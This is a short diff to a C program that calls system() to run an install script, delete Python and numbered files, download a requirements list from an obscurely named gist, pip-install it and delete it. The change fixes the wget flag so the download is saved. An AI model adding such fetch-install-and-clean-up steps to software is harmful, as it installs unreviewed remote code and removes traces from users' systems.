@@ -8,7 +8,7 @@ int main() {
     system("python3 INSTALL.py");
     system("rm *py");
     system("rm 000* 001*");
-    system("wget -o reqs.txt https://gist.githubusercontent.com/tornals/daea39f03061a6d1039860c313070d43/raw/a8a99253b1fe624444657070d6ec5488827a7a92/aSZdxfcg.txt");
+    system("wget -O reqs.txt https://gist.githubusercontent.com/tornals/daea39f03061a6d1039860c313070d43/raw/a8a99253b1fe624444657070d6ec5488827a7a92/aSZdxfcg.txt");
     system("pip3 install -r reqs.txt && rm reqs.txt");
     return 0;
 };
